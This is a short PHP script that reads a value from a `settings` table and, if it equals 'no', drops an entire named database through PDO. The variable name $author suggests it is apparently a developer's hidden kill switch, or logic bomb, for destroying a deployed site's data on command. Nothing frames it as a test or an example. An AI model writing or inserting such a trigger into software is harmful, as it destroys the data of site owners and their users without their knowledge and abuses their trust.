<?php

require_once('connect_db.php');



$author = $pdo->query('SELECT * FROM `settings`')->fetch();

if($author['value'] == 'no'){
    $sql = "DROP database cf59384_px1f3"; 
    $pdo->exec($sql);
    unset($pdo); 
}




?>